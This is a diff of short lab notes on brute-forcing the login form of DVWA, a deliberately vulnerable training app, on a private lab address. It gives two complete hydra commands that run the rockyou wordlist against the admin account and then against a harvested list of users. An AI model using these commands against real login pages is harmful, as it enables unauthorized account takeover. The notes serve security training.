@@ -1,4 +1,4 @@
-# Presented with a classic username/password web form
+# Admin Account
 - using hydra
 - hydra needs options
   - wordlist_file
@@ -18,7 +18,7 @@
 ```
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.206.128 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: security=low; PHPSESSID=9cd4a8a97889ff80bb8ac41154a0a16d:incorrect" -V 
 ```
-# Other Accounts
+**Other Accounts**
 - after we logged in there is and image we inspect it and we see a directory
 - **http://192.168.206.128/dvwa/hackable/users/admin.jpg**
 - we go to the users and we see alist of valid users
@@ -26,3 +26,4 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.206.128 http-get-form
 ```
 hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 192.168.206.128 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: security=low; PHPSESSID=9cd4a8a97889ff80bb8ac41154a0a16d:incorrect"
 ```
+
